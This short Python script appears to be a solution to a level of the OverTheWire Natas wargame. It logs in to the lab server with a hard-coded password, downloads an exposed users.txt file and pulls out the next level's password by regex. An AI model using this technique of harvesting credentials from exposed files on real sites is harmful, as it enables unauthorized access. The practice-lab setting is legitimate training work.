import requests
import re

url='http://natas2.natas.labs.overthewire.org/files/users.txt'
username='natas2'
password='ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi'

website=requests.get(url,auth=(username,password))
print(re.findall('natas3:(.*)',website.text))